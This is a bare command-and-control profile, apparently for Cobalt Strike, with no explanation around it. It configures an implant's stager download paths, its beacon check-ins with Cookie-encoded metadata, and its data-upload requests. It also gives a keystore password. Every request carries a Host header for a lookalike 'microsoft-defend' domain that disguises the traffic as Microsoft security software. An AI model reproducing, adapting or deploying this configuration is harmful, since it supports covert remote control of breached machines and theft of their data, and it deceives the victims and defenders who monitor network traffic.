https-certificate {
set keystore "cfcert.store";
set password "UPNV7J6rqSbc3Ay";
}
http-config {
header "Content-Type" "application";
}
http-stager {
set uri_x86 "/api/1";
set uri_x64 "/api/2";
client {
header "Host" "micrcs.microsoft-defend.club";}
server {
output{
print;
}
}
}
http-get {
set uri "/api/3";
client {
header "Host" "micrcs.microsoft-defend.club";
metadata {
base64;
header "Cookie";
}
}
server {
output{
print;
}
}
}
http-post {
set uri "/api/4";
client {
header "Host" "micrcs.microsoft-defend.club";
id {
uri-append;
}
output{
print;
}
}
server {
output{
print;
}
}
}
